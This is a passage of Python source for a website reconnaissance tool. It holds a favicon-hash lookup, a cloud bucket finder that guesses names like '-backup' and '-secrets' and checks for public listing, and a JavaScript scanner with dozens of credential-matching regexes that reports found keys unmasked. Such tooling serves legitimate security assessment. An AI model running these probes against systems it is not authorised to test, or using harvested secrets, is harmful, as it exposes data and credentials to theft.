            break
        except Exception:
            continue

    # Step 2 — if still not found, probe the common paths IN PARALLEL (https only),
    # first valid image wins. Bounded by a single 5s slice, not 18 sequential ones.
    if not favicon_data:
        def _try(path):
            try:
                u = f"https://{domain}{path}"
                r = requests.get(u, timeout=5, verify=False, allow_redirects=True,
                                 headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"})
                return (u, r.content) if _valid_icon(r) else None
            except Exception:
                return None
        with concurrent.futures.ThreadPoolExecutor(max_workers=len(FAVICON_PATHS)) as ex:
            for res in ex.map(_try, FAVICON_PATHS):
                if res:
                    favicon_url, favicon_data = res
                    break

    if not favicon_data:
        result["error"] = "No favicon found"
        return result

    result["favicon_found"] = True
    result["favicon_url"]   = favicon_url
    result["size_bytes"]    = len(favicon_data)

    # Compute hashes
    # Shodan uses: mmh3(base64(favicon_content))
    b64_favicon      = base64.encodebytes(favicon_data).decode()
    result["hash_shodan"] = mmh3_hash(b64_favicon.encode())
    result["hash_md5"]    = hashlib.md5(favicon_data).hexdigest()
    result["hash_sha256"] = hashlib.sha256(favicon_data).hexdigest()

    # Technology detection from MD5 partial match
    md5_prefix = result["hash_md5"][:24]
    for sig, tech in FAVICON_TECH_DB.items():
        if sig[:12] in md5_prefix or md5_prefix[:12] in sig:
            result["technology"] = tech
            break

    # Build search links for cross-infrastructure discovery
    shodan_hash = result["hash_shodan"]
    md5_hash    = result["hash_md5"]
    result["search_links"] = {
        "Shodan":  f"https://www.shodan.io/search?query=http.favicon.hash%3A{shodan_hash}",
        "Censys":  f"https://search.censys.io/search?q=services.http.response.favicons.md5_hash%3D{md5_hash}",
        "FOFA":    f"https://en.fofa.info/result?qbase64={base64.b64encode(f'icon_hash={shodan_hash}'.encode()).decode()}",
        "ZoomEye": f"https://www.zoomeye.org/searchResult?q=iconhash%3A{shodan_hash}",
        "Hunter":  f"https://hunter.how/list?searchValue=icon_hash%3D{shodan_hash}",
    }

    return result


# ═══════════════════════════════════════════════════════════════════
# MODULE: CLOUD BUCKET FINDER
# ═══════════════════════════════════════════════════════════════════
def scan_cloud_buckets(domain):
    """
    Finds exposed cloud storage buckets (S3, Azure Blob, GCP, DigitalOcean).
    Generates name permutations from the domain, probes each bucket URL,
    and checks if the bucket is publicly listable or accessible.
    No external tools — pure HTTP probing.
    """
    import re as _re
    import threading as _thr
    import xml.etree.ElementTree as _xml

    # Extract org name candidates from domain
    parts    = domain.lower().replace("-", "").split(".")
    org_name = parts[0]  # e.g. "acme" from "acme.com"
    org_dash = domain.split(".")[0]  # with dashes: "my-corp"

    # Generate bucket name permutations
    SUFFIXES = [
        "", "-backup", "-backups", "-bak", "-prod", "-production",
        "-staging", "-stage", "-dev", "-development", "-test",
        "-data", "-logs", "-log", "-static", "-assets", "-media",
        "-public", "-private", "-files", "-uploads", "-cdn",
        "-storage", "-archive", "-archives", "-db", "-database",
        "-secret", "-secrets", "-config", "-configs", "-internal",
    ]
    PREFIXES = ["", "backup-", "static-", "assets-", "media-", "dev-",
                "prod-", "staging-", "cdn-", "files-"]

    bucket_names = set()
    for prefix in PREFIXES:
        for suffix in SUFFIXES:
            for base in [org_name, org_dash]:
                name = f"{prefix}{base}{suffix}"
                if 3 <= len(name) <= 63:
                    bucket_names.add(name)

    result = {
        "domain":      domain,
        "org_name":    org_name,
        "checked":     0,
        "exposed":     [],
        "total":       0,
    }

    _lock = _thr.Lock()

    # ── S3 bucket probe ──
    def check_s3(bucket_name):
        url = f"https://{bucket_name}.s3.amazonaws.com/"
        try:
            r = requests.get(url, timeout=5, verify=False, allow_redirects=True,
                             headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"})
            if r.status_code == 200:
                # Try to parse XML listing
                try:
                    root    = _xml.fromstring(r.text)
                    ns      = {"s3": "http://s3.amazonaws.com/doc/2006-03-01/"}
                    objects = root.findall(".//s3:Key", ns) or root.findall(".//Key")
                    count   = len(objects)
                    sample  = [o.text for o in objects[:5]]
                    return {
                        "bucket": bucket_name, "provider": "AWS S3",
                        "url": url, "severity": "critical",
                        "status": "PUBLIC — directory listing enabled",
                        "files_exposed": count, "sample_files": sample,
                    }
                except Exception:
                    return {
                        "bucket": bucket_name, "provider": "AWS S3",
                        "url": url, "severity": "critical",
                        "status": "PUBLIC — accessible (no listing)",
                        "files_exposed": 0, "sample_files": [],
                    }
            # 403 on S3 = unreliable (same response whether bucket exists or not)
            # Only report 200 = actually public
        except Exception:
            pass
        return None

    # ── Azure Blob probe ──
    def check_azure(bucket_name):
        for suffix in ["", "-storage", "-blob"]:
            acct = (bucket_name + suffix).replace("-", "")[:24]
            if len(acct) < 3:
                continue
            url = f"https://{acct}.blob.core.windows.net/{bucket_name}?restype=container&comp=list"
            try:
                r = requests.get(url, timeout=5, verify=False,
                                 headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"})
                if r.status_code == 200:
                    count = r.text.count("<Name>")
                    return {
                        "bucket": bucket_name, "provider": "Azure Blob",
                        "url": url, "severity": "critical",
                        "status": f"PUBLIC — container listing enabled ({count} objects)",
                        "files_exposed": count, "sample_files": [],
                    }
                # 403 on Azure catch-all = not a real account, skip
            except Exception:
                continue
        return None

    # ── GCP Storage probe ──
    def check_gcp(bucket_name):
        url = f"https://storage.googleapis.com/{bucket_name}/"
        try:
            r = requests.get(url, timeout=5, verify=False,
                             headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"})
            if r.status_code == 200:
                count = r.text.count("<Key>")
                return {
                    "bucket": bucket_name, "provider": "GCP Storage",
                    "url": url, "severity": "critical",
                    "status": f"PUBLIC — bucket accessible ({count} objects visible)",
                    "files_exposed": count, "sample_files": [],
                }
            # 403 on GCP = unreliable, skip
        except Exception:
            pass
        return None

    def probe_bucket(name):
        found = []
        for check_fn in [check_s3, check_azure, check_gcp]:
            res = check_fn(name)
            if res:
                found.append(res)
        return found

    names_list = sorted(bucket_names)
    result["checked"] = len(names_list) * 3  # 3 providers each

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
        for batch in ex.map(probe_bucket, names_list):
            if batch:
                with _lock:
                    result["exposed"].extend(batch)

    # Sort: critical first, then by provider
    result["exposed"].sort(
        key=lambda x: ({"critical": 0, "high": 1, "medium": 2}.get(x["severity"], 3),
                        x["provider"])
    )
    result["total"] = len(result["exposed"])
    return result



# ═══════════════════════════════════════════════════════════════════
# MODULE: JS FILE SECRET SCANNER
# ═══════════════════════════════════════════════════════════════════
def _plausible_secret(value, secret_type=""):
    """
    Reject obvious non-secrets so a wider scan doesn't drown the real hits.

    Filters out documentation placeholders ("YOUR_API_KEY", "xxxxx"), template
    variables ({{key}}, ${env.KEY}, process.env.X) and low-entropy strings —
    minified bundles are full of 32-char hashes that otherwise match generic
    patterns like the Twilio SID or Mailgun key formats.
    """
    if not value:
        return False
    v = value.strip().strip('"\'')
    if len(v) < 8:
        return False
    low = v.lower()

    import math

    def entropy_of(s):
        counts = {}
        for ch in s:
            counts[ch] = counts.get(ch, 0) + 1
        return -sum((c / len(s)) * math.log2(c / len(s)) for c in counts.values())

    # Prefixed, self-identifying tokens (AKIA…, ghp_…, sk_live_…, glpat-…) are
    # unambiguous by construction, so they are checked first and only against
    # blatant placeholders — a strict substring filter would otherwise discard
    # perfectly valid keys that happen to contain a common letter run.
    STRONG_PREFIX = ("AKIA", "ghp_", "gho_", "ghs_", "ghu_", "ghr_", "glpat-",
                     "sk_live_", "sk_test_", "rk_live_", "xox", "SG.", "shppa_",
                     "shpss_", "AIza", "ya29.", "eyJ", "sk-", "sq0atp-", "sq0csp-",
                     "-----BEGIN", "npm_", "dop_v1_", "hvs.", "ATATT", "hf_")
    OBVIOUS = ("your", "example", "placeholder", "changeme", "redacted",
               "xxxx", "yyyy", "dummy", "insert", "<your", "notreal")
    if any(v.startswith(p) for p in STRONG_PREFIX):
        if any(p in low for p in OBVIOUS):
            return False
        return entropy_of(v) >= 2.0

    PLACEHOLDERS = (
        "your", "example", "sample", "placeholder", "changeme", "change_me",
        "insert", "dummy", "test_key", "testkey", "fake", "xxxx", "yyyy", "zzzz",
        "aaaa", "1234567", "abcdef", "none", "null", "undefined", "todo",
        "redacted", "hidden", "removed", "notreal", "my_", "lorem",
    )
    if any(p in low for p in PLACEHOLDERS):
        return False
    # template / env-var references, not literal values
    if any(t in v for t in ("{{", "}}", "${", "<%", "%>", "process.env", "os.environ",
                            "getenv", "import.meta.env", "REACT_APP_", "VITE_")):
        return False
    if v.startswith(("$", "%", "#{", "@")):
        return False
    # a single repeated character, or too few distinct characters
    if len(set(v)) <= 3:
        return False

    # Connection strings / URLs are meaningful as-is
    if "://" in v:
        return True

    entropy = entropy_of(v)
    # Generic catches (API Key, Secret Key, Auth Token, Twilio SID…) must look
    # genuinely random to survive.
    if entropy < 3.2:
        return False
    # pure lowercase hex of exactly 32 chars is usually an asset/build hash
    if len(v) == 32 and all(c in "0123456789abcdef" for c in low):
        return False
    return True


def scan_js_secrets(domain):
    """
    Scans JS files linked from the homepage for hardcoded secrets.
    Fetches each file IN MEMORY (no download), scans with 40+ regex patterns.
    Shows secrets in clear text — no masking.
    Skips third-party CDNs automatically.
    """
    import re as _re
    import urllib.parse as _up
    import threading as _thr

    SECRET_PATTERNS = [
        # ── AWS ──────────────────────────────────────────────────────
        (_re.compile(r'AKIA[0-9A-Z]{16}'),                                                                      "AWS Access Key ID",      "critical"),
        (_re.compile(r'(?i)(aws.?secret.?access.?key|aws_secret)\s*[:=]\s*["\']?([A-Za-z0-9/+=]{40})["\']?'),  "AWS Secret Key",          "critical"),
        (_re.compile(r'(?i)aws.?session.?token\s*[:=]\s*["\']([A-Za-z0-9/+=]{100,})["\']'),                    "AWS Session Token",       "critical"),
        (_re.compile(r'(?i)aws.?account.?id\s*[:=]\s*["\']?(\d{12})["\']?'),                                   "AWS Account ID",          "high"),
        # ── Google ───────────────────────────────────────────────────
        (_re.compile(r'AIza[0-9A-Za-z\-_]{35}'),                                                                "Google API Key",          "high"),
        (_re.compile(r'(?i)google.?client.?secret\s*[:=]\s*["\']([^"\']{20,})["\']'),                          "Google Client Secret",    "high"),
        (_re.compile(r'(?i)google.?oauth.?token\s*[:=]\s*["\']([^"\']{20,})["\']'),                            "Google OAuth Token",      "high"),
        (_re.compile(r'ya29\.[0-9A-Za-z\-_]+'),                                                                 "Google OAuth Token",      "high"),
        # ── GitHub ───────────────────────────────────────────────────
        (_re.compile(r'ghp_[A-Za-z0-9]{36}'),                                                                   "GitHub Personal Token",   "critical"),
        (_re.compile(r'gho_[A-Za-z0-9]{36}'),                                                                   "GitHub OAuth Token",      "critical"),
        (_re.compile(r'ghs_[A-Za-z0-9]{36}'),                                                                   "GitHub App Token",        "critical"),
        (_re.compile(r'(?i)github.?token\s*[:=]\s*["\']([A-Za-z0-9_\-]{20,})["\']'),                          "GitHub Token",            "critical"),
        # ── Stripe ───────────────────────────────────────────────────
        (_re.compile(r'sk_live_[0-9a-zA-Z]{24,}'),                                                              "Stripe Live Secret Key",  "critical"),
        (_re.compile(r'sk_test_[0-9a-zA-Z]{24,}'),                                                              "Stripe Test Secret Key",  "high"),
        (_re.compile(r'rk_live_[0-9a-zA-Z]{24,}'),                                                              "Stripe Restricted Key",   "critical"),
        # ── Slack ────────────────────────────────────────────────────
        (_re.compile(r'xox[baprs]-[0-9a-zA-Z\-]{10,}'),                                                        "Slack Token",             "high"),
        (_re.compile(r'https://hooks\.slack\.com/services/[A-Za-z0-9/]+'),                                      "Slack Webhook",           "high"),
        # ── Twilio ───────────────────────────────────────────────────
        (_re.compile(r'AC[a-z0-9]{32}'),                                                                        "Twilio Account SID",      "high"),
        (_re.compile(r'SK[0-9a-fA-F]{32}'),                                                                     "Twilio API Key",          "high"),
        # ── SendGrid ─────────────────────────────────────────────────
        (_re.compile(r'SG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}'),                                         "SendGrid API Key",        "high"),
        # ── Mailgun / Mailchimp ───────────────────────────────────────
        (_re.compile(r'key-[0-9a-zA-Z]{32}'),                                                                   "Mailgun API Key",         "high"),
        (_re.compile(r'(?i)mailchimp.?api.?key\s*[:=]\s*["\']([a-zA-Z0-9\-]{36})["\']'),                      "Mailchimp API Key",       "high"),
        # ── Firebase ─────────────────────────────────────────────────
        (_re.compile(r'(?i)(firebase.?api.?key|firebase.?key)\s*[:=]\s*["\']([A-Za-z0-9\-_]{30,})["\']'),     "Firebase API Key",        "high"),
        (_re.compile(r'https://[a-zA-Z0-9\-]+\.firebaseio\.com'),                                               "Firebase Database URL",   "medium"),
        # ── JWT ──────────────────────────────────────────────────────
        (_re.compile(r'eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.?[A-Za-z0-9\-_=]*'),                           "JWT Token",               "high"),
        (_re.compile(r'(?i)(jwt.?secret|jwt.?key|token.?secret)\s*[:=]\s*["\']([^"\']{16,})["\']'),            "JWT Secret",              "critical"),
        # ── Database URLs ────────────────────────────────────────────
        (_re.compile(r'(?i)mongodb(\+srv)?://[^\s"\'<>]{8,}'),                                                  "MongoDB URL",             "critical"),
        (_re.compile(r'(?i)postgres(ql)?://[^\s"\'<>]{8,}'),                                                    "PostgreSQL URL",          "critical"),
        (_re.compile(r'(?i)mysql://[^\s"\'<>]{8,}'),                                                            "MySQL URL",               "critical"),
        (_re.compile(r'(?i)redis://[^\s"\'<>]{8,}'),                                                            "Redis URL",               "high"),
        (_re.compile(r'(?i)amqp://[^\s"\'<>]{8,}'),                                                             "AMQP/RabbitMQ URL",       "high"),
        # ── Generic API Keys / Tokens ────────────────────────────────
        (_re.compile(r'(?i)(api[_\-]?key|apikey|api[_\-]?secret)\s*[:=]\s*["\']([A-Za-z0-9\-_]{16,64})["\']'), "API Key",               "high"),
        (_re.compile(r'(?i)(secret[_\-]?key|client[_\-]?secret)\s*[:=]\s*["\']([^"\']{16,})["\']'),           "Secret Key",              "high"),
        (_re.compile(r'(?i)(access[_\-]?token|auth[_\-]?token|bearer[_\-]?token)\s*[:=]\s*["\']([A-Za-z0-9\-_.]{20,})["\']'), "Auth Token", "high"),
        (_re.compile(r'(?i)(password|passwd|db_pass|db_password)\s*[:=]\s*["\']([^"\']{8,64})["\']'),          "Hardcoded Password",      "high"),
        # ── Private Keys ─────────────────────────────────────────────
        (_re.compile(r'-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----'),                                  "Private Key",             "critical"),
        # ── Internal URLs ────────────────────────────────────────────
        (_re.compile(r'https?://(localhost|127\.0\.0\.1|10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(1[6-9]|2\d|3[01])\.\d+\.\d+)[:\d/]\S+'), "Internal URL", "medium"),
        # ── Heroku / Netlify / Vercel ─────────────────────────────────
        (_re.compile(r'(?i)heroku.?api.?key\s*[:=]\s*["\']([0-9a-fA-F\-]{36})["\']'),                         "Heroku API Key",          "high"),
        (_re.compile(r'(?i)(netlify|vercel).?token\s*[:=]\s*["\']([A-Za-z0-9_\-]{20,})["\']'),                 "Netlify/Vercel Token",    "high"),
        # ── Shopify ───────────────────────────────────────────────────
        (_re.compile(r'shppa_[a-fA-F0-9]{32}'),                                                                 "Shopify Private App Key", "critical"),
        (_re.compile(r'shpss_[a-fA-F0-9]{32}'),                                                                 "Shopify Shared Secret",   "critical"),
        # ── AI / LLM providers ────────────────────────────────────────
        (_re.compile(r'sk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}'),                                             "OpenAI API Key",          "critical"),
        (_re.compile(r'sk-proj-[A-Za-z0-9_\-]{20,}'),                                                           "OpenAI Project Key",      "critical"),
        (_re.compile(r'sk-ant-api\d{2}-[A-Za-z0-9_\-]{20,}'),                                                   "Anthropic API Key",       "critical"),
        (_re.compile(r'(?i)hf_[A-Za-z0-9]{34}'),                                                                "HuggingFace Token",       "high"),
        # ── GitLab / Atlassian / npm / packages ───────────────────────
        (_re.compile(r'glpat-[A-Za-z0-9_\-]{20}'),                                                              "GitLab Personal Token",   "critical"),
        (_re.compile(r'npm_[A-Za-z0-9]{36}'),                                                                   "npm Access Token",        "critical"),
        (_re.compile(r'ATATT[A-Za-z0-9_\-=]{20,}'),                                                             "Atlassian API Token",     "critical"),
        (_re.compile(r'dop_v1_[a-f0-9]{64}'),                                                                   "DigitalOcean Token",      "critical"),
        (_re.compile(r'hvs\.[A-Za-z0-9_\-]{20,}'),                                                              "HashiCorp Vault Token",   "critical"),
        # ── Supabase / Algolia / Mapbox / Cloudinary / Airtable ───────
        (_re.compile(r'(?i)supabase[._\-]?(?:anon|service[._\-]?role)?[._\-]?key\s*[:=]\s*["\']([A-Za-z0-9._\-]{30,})["\']'), "Supabase Key", "high"),
        (_re.compile(r'(?i)algolia[._\-]?(?:admin|api)?[._\-]?key\s*[:=]\s*["\']([A-Za-z0-9]{32})["\']'),      "Algolia API Key",         "high"),
        (_re.compile(r'sk\.eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}'),                                       "Mapbox Secret Token",     "critical"),
        (_re.compile(r'cloudinary://[0-9]{10,}:[A-Za-z0-9_\-]{20,}@[A-Za-z0-9_\-]+'),                           "Cloudinary URL",          "critical"),
        (_re.compile(r'(?i)airtable[._\-]?api[._\-]?key\s*[:=]\s*["\'](key[A-Za-z0-9]{14})["\']'),             "Airtable API Key",        "high"),
        (_re.compile(r'pat[A-Za-z0-9]{14}\.[a-f0-9]{64}'),                                                      "Airtable PAT",            "critical"),
        # ── Payments ──────────────────────────────────────────────────
        (_re.compile(r'sq0atp-[A-Za-z0-9_\-]{22}'),                                                             "Square Access Token",     "critical"),
        (_re.compile(r'sq0csp-[A-Za-z0-9_\-]{43}'),                                                             "Square OAuth Secret",     "critical"),
        (_re.compile(r'access_token\$production\$[a-z0-9]{16}\$[a-f0-9]{32}'),                                  "Braintree Token",         "critical"),
        # ── Messaging / bots ──────────────────────────────────────────
        (_re.compile(r'\d{9,10}:AA[A-Za-z0-9_\-]{33}'),                                                         "Telegram Bot Token",      "high"),
        (_re.compile(r'https://discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_\-]+'),                         "Discord Webhook",         "high"),
        (_re.compile(r'(?i)twilio[._\-]?auth[._\-]?token\s*[:=]\s*["\']([a-f0-9]{32})["\']'),                  "Twilio Auth Token",       "critical"),
        # ── Monitoring / infra ────────────────────────────────────────
        (_re.compile(r'https://[a-f0-9]{32}@[a-z0-9.\-]*sentry\.io/\d+'),                                       "Sentry DSN (with key)",   "medium"),
        (_re.compile(r'(?i)datadog[._\-]?api[._\-]?key\s*[:=]\s*["\']([a-f0-9]{32})["\']'),                    "Datadog API Key",         "high"),
        (_re.compile(r'(?i)new[._\-]?relic[._\-]?(?:license|api)[._\-]?key\s*[:=]\s*["\']([A-Za-z0-9]{40})["\']'), "New Relic Key",       "high"),
        # ── Azure / cloud storage ─────────────────────────────────────
        (_re.compile(r'DefaultEndpointsProtocol=https;AccountName=[A-Za-z0-9]+;AccountKey=[A-Za-z0-9+/=]{80,}'), "Azure Storage Key",      "critical"),
        (_re.compile(r'(?i)"type"\s*:\s*"service_account"'),                                                    "GCP Service Account JSON","critical"),
        (_re.compile(r'(?i)sas[._\-]?token\s*[:=]\s*["\'](sv=[^"\']{20,})["\']'),                              "Azure SAS Token",         "high"),
        # ── Basic auth in URLs ────────────────────────────────────────
        (_re.compile(r'https?://[A-Za-z0-9._%\-]{2,40}:[^\s"\'@/]{4,40}@[A-Za-z0-9.\-]{3,}'),                   "Credentials in URL",      "critical"),
    ]

    SKIP_CDNS = [
        "jquery", "bootstrap", "google-analytics", "googletagmanager",
        "facebook.net", "twitter", "cdn.jsdelivr", "cdnjs.cloudflare",
        "unpkg.com", "ajax.googleapis", "hotjar", "intercom",
        "segment.io", "mixpanel", "recaptcha", "cloudflare.com/ajax",
        "newrelic", "datadog", "sentry-cdn", "bugsnag",
    ]

    result = {"domain": domain, "js_files": [], "secrets": [], "total": 0,
              "sources": {"inline_scripts": 0, "js_files": 0, "html": 0, "chunks": 0}}

    UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"}
    MAX_FILES = 60

    # The site's own brand token, e.g. "github" for github.com — asset hosts such
    # as github.githubassets.com or static.shop-cdn.net belong to the target even
    # though the netloc is not the domain itself. Only skipping the *known*
    # third-party CDNs (rather than requiring an exact domain match) is what lets
    # us actually reach a modern site's real application bundles.
    brand = domain.split(".")[0].lower()

    def is_first_party(netloc):
        if not netloc:
            return True
        nl = netloc.lower()
        if any(c in nl for c in SKIP_CDNS):
            return False
        if domain in nl or nl.endswith("." + domain):
            return True
        if len(brand) >= 4 and brand in nl:
            return True          # github.githubassets.com, corp-cdn.net, …
        if any(nl.startswith(p) for p in ("assets.", "static.", "cdn.", "js.", "media.")):
            return True
        return False

    def absolutise(url, scheme, base_netloc=None):
        url = url.strip()
        if url.startswith("//"):
            return "https:" + url
        if url.startswith(("http://", "https://")):
            return url
        if url.startswith("/"):
            return f"{scheme}://{base_netloc or domain}{url}"
        return f"{scheme}://{base_netloc or domain}/" + url.lstrip("./")

    sources = []          # (label, text) pairs that get scanned
    js_urls = set()

    # ── Step 1: homepage — scan the HTML itself, every inline script, and
    #    collect JS from <script src>, <link rel=preload/modulepreload>, and
    #    plain "....js" strings in the markup. ─────────────────────────────
    html, used_scheme = None, "https"
    for scheme in ["https", "http"]:
        try:
            resp = requests.get(f"{scheme}://{domain}", timeout=9, verify=False,
                                allow_redirects=True, headers=UA)
            if resp.status_code == 200 and resp.text:
                html, used_scheme = resp.text, scheme
                break
        except Exception:
            continue

    if html:
        sources.append(("(homepage HTML)", html[:800_000]))
        result["sources"]["html"] = 1

        # inline <script> blocks — a very common home for config objects
        for m in _re.finditer(r'(?is)<script(?![^>]*\bsrc=)[^>]*>(.*?)</script>', html):
            blk = m.group(1)
            if blk and blk.strip():
                result["sources"]["inline_scripts"] += 1
                sources.append((f"(inline script #{result['sources']['inline_scripts']})",
                                blk[:400_000]))

        # <script src>, preloaded modules, and any bare .js reference
        patterns = [
            r'<script[^>]+src=["\']([^"\'> ]+)["\']',
            r'<link[^>]+(?:rel=["\'](?:modulepreload|preload)["\'][^>]*)href=["\']([^"\']+\.m?js[^"\']*)["\']',
            r'<link[^>]+href=["\']([^"\']+\.m?js[^"\']*)["\'][^>]*rel=["\'](?:modulepreload|preload)["\']',
            r'["\'](/[^"\'<>\s]+\.m?js(?:\?[^"\'<>\s]{0,60})?)["\']',
        ]
        for pat in patterns:
            for m in _re.finditer(pat, html, _re.I):
                raw = m.group(1).strip()
                if not raw or any(c in raw.lower() for c in SKIP_CDNS):
                    continue
                u = absolutise(raw, used_scheme)
                if is_first_party(_up.urlparse(u).netloc):
                    js_urls.add(u)

    if not js_urls and not sources:
        result["error"] = "Homepage unreachable — nothing to scan"
        return result

    # ── Step 2: fetch the JS files, then follow one level of webpack/Vite
    #    chunk references found inside them (that is where SPA secrets live). ──
    _lock = _thr.Lock()
    fetched = set()

    def fetch_js(u, collect_chunks=False):
        if u in fetched or len(fetched) >= MAX_FILES:
            return []
        fetched.add(u)
        try:
            r = requests.get(u, timeout=9, verify=False, headers=UA)
            if r.status_code != 200 or not r.text:
                return []
            body = r.text[:800_000]
        except Exception:
            return []
        with _lock:
            sources.append((u.split("?")[0][-70:], body))
            result["js_files"].append(u)
        if not collect_chunks:
            return []
        # chunk manifests: "static/js/453.9f2a.chunk.js", "/assets/index-ab12.js"
        found = []
        base_netloc = _up.urlparse(u).netloc
        for m in _re.finditer(r'["\']([\w./\-]{3,120}?\.m?js)(?:\?[\w=&.\-]{0,40})?["\']', body):
            cand = m.group(1)
            if any(c in cand.lower() for c in SKIP_CDNS):
                continue
            if not any(k in cand for k in ("chunk", "static/js", "assets/", "/js/", "bundle", "main", "vendor", "app")):
                continue
            cu = absolutise(cand, used_scheme, base_netloc)
            if is_first_party(_up.urlparse(cu).netloc) and cu not in fetched:
                found.append(cu)
        return found[:40]

    primary = list(js_urls)[:MAX_FILES]
    chunk_lists = []
    if primary:
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            chunk_lists = list(ex.map(lambda u: fetch_js(u, True), primary))

    chunks = []
    for lst in chunk_lists:
        for c in lst:
            if c not in fetched and c not in chunks:
                chunks.append(c)
    chunks = chunks[:max(0, MAX_FILES - len(fetched))]
    if chunks:
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            list(ex.map(lambda u: fetch_js(u, False), chunks))
        result["sources"]["chunks"] = len(chunks)

    result["sources"]["js_files"] = len(result["js_files"])

    # ── Step 3: scan every collected source ─────────────────────────────────
    def scan_text(label, content):
        for pattern, secret_type, severity in SECRET_PATTERNS:
            for match in pattern.finditer(content):
                # Pick the most meaningful capture: the longest group, falling
                # back to the whole match. (Some patterns have small optional
                # groups such as "(\\+srv)" that must not be taken as the value.)
                value = match.group(0)
                try:
                    groups = [g for g in (match.groups() or ()) if g]
                    if groups:
                        longest = max(groups, key=len)
                        if len(longest) >= max(8, len(match.group(0)) // 3):
                            value = longest
                except Exception:
                    pass
                value = (value or "").strip()
                if not _plausible_secret(value, secret_type):
                    continue
                start = content.rfind('\n', 0, match.start()) + 1
                end = content.find('\n', match.end())
                line = content[start:end if end > 0 else start + 160].strip()[:160]
                with _lock:
                    result["secrets"].append({
                        "type": secret_type,
                        "severity": severity,
                        "value": value[:200],       # clear text, no masking
                        "file": label,
                        "line": line,
                    })

    for label, text in sources:
        try:
            scan_text(label, text)
        except Exception:
            pass

    # Deduplicate: one finding per (type + value) pair
    seen, unique = set(), []
    for s in result["secrets"]:
        key = (s["type"], s["value"][:40])
        if key not in seen:
            seen.add(key)
            unique.append(s)

    result["secrets"] = sorted(
        unique,
        key=lambda x: {"critical": 0, "high": 1, "medium": 2, "low": 3}.get(x["severity"], 4)
    )
    result["total"] = len(result["secrets"])
    return result


# ═══════════════════════════════════════════════════════════════════
# MODULE: CONTENT INTELLIGENCE (JS/HTML URL & info extractor)
# ═══════════════════════════════════════════════════════════════════
def scan_http_inspect(domain):
    """
    HTTP Inspector — the DevTools "Network" tab, headless.

    Shows exactly what went out and what came back:
      • Full request headers Kumo sent
      • Full response headers, verbatim and in order
      • The complete redirect chain (each hop, status, Location, timing)
      • Cookies with their security flags (Secure / HttpOnly / SameSite)
      • Response timing, size, protocol, final URL, TLS details
      • Allowed HTTP methods (OPTIONS) and CORS behaviour
      • Notable/non-standard headers a defender should look at

    Detection/inspection only — plain GET/OPTIONS requests, no payloads.
    """
    if not HAS_REQUESTS:
        return {"error": "requests required"}

    import time as _t
    UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
          "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")

    # Only advertise content encodings we can actually decode. Claiming "br"
    # without the brotli module means the server sends brotli-compressed bytes
    # that requests cannot inflate — the body then reads as binary garbage.
    _encodings = ["gzip", "deflate"]
    try:
        import brotli  # noqa: F401
        _encodings.append("br")
    except Exception:
        try:
            import brotlicffi  # noqa: F401
            _encodings.append("br")
        except Exception:
            pass
    try:
        import zstandard  # noqa: F401
        _encodings.append("zstd")
    except Exception:
        pass

    REQ_HEADERS = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": ", ".join(_encodings),
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }
    try:
        import urllib3
        urllib3.disable_warnings()
    except Exception:
        pass

    result = {
        "domain": domain, "request": {}, "response": {}, "redirect_chain": [],
        "cookies": [], "timing": {}, "methods": {}, "cors": {},
        "notable_headers": [], "security_headers": {}, "error": None,
    }

    resp = None
    scheme_used = None
    for scheme in ("https", "http"):
        try:
            t0 = _t.time()
            resp = requests.get(f"{scheme}://{domain}", headers=REQ_HEADERS,
                                timeout=12, verify=False, allow_redirects=True)
            result["timing"]["total_ms"] = round((_t.time() - t0) * 1000)
            scheme_used = scheme
            break
        except Exception as e:
            result["error"] = str(e)[:120]
            continue
    if resp is None:
        return {"error": result["error"] or "Host unreachable"}

    result["error"] = None

    # ── REQUEST (exactly what we sent, after requests' own additions) ──
    try:
        sent = resp.request
        result["request"] = {
            "method":     sent.method,
            "url":        sent.url,
            "http_line":  f"{sent.method} {sent.path_url} HTTP/1.1",
            "headers":    [{"name": k, "value": str(v)} for k, v in sent.headers.items()],
            "body":       (sent.body or "") if isinstance(sent.body, str) else "",
        }
    except Exception:
        result["request"] = {"headers": [{"name": k, "value": v} for k, v in REQ_HEADERS.items()]}

    # ── REDIRECT CHAIN (every hop, like DevTools) ──
    for hop in list(resp.history) + [resp]:
        try:
            result["redirect_chain"].append({
                "url":         hop.url,
                "status":      hop.status_code,
                "reason":      getattr(hop, "reason", ""),
                "location":    hop.headers.get("Location", ""),
                "size":        len(hop.content) if hop is resp else int(hop.headers.get("Content-Length") or 0),
                "elapsed_ms":  round(hop.elapsed.total_seconds() * 1000) if hop.elapsed else 0,
                "server":      hop.headers.get("Server", ""),
            })
        except Exception:
            pass

    # ── RESPONSE ──
    body_preview = ""
    try:
        ct = resp.headers.get("Content-Type", "").lower()
